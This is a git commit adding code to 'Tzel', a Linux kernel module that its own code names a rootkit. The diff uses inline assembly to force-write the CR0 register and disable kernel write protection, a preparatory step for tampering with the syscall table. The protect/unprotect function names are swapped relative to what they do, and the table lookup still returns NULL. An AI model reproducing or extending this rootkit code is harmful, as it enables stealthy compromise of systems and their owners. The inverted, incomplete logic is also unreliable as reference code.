c41b8f4a28d52d3a2988d7a18c4a29e75844b971
Pedro Peck <pedrop.peck@gmail.com>
2020-06-29 19:23:02 +0300

    Add memory write-protection enabling and disabling function - protect_memory()/unprotect_memory().

--- tzel.c
+++ tzel.c
@@ -7,15 +7,51 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h>
+#include <asm/paravirt.h>
 
-static unsigned long * get_syscall_table(void)
+static unsigned long *sys_call_table;
+static unsigned long orig_cr0;
+
+static inline void write_cr0_forced(unsigned long val)
+{
+    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
+}
+
+static inline void protect_memory(void)
+{
+    orig_cr0 = read_cr0();
+    write_cr0_forced(orig_cr0 & (~X86_CR0_WP));
+}
+
+static inline void unprotect_memory(void)
+{
+    write_cr0_forced(orig_cr0);
+}
+
+static long * get_sys_call_table(void) 
 {
     return NULL;
 }
 
 static int __init init_rootkit(void)
 {
-    printk(KERN_INFO "%p\n", get_syscall_table());
+    unsigned long cr0;
+    printk(KERN_INFO "Loading Tzel.\n");
+
+    cr0 = read_cr0();
+    printk(KERN_INFO "cr0: %lx\n", cr0);
+
+    printk(KERN_INFO "Unprotecting...\n");
+    unprotect_memory();
+
+    cr0 = read_cr0();
+    printk(KERN_INFO "cr0: %lx\n", cr0);
+
+    printk(KERN_INFO "Protecting...\n");
+    protect_memory();
+
+    cr0 = read_cr0();
+    printk(KERN_INFO "cr0: %lx\n", cr0);
 
     return 0;
 }
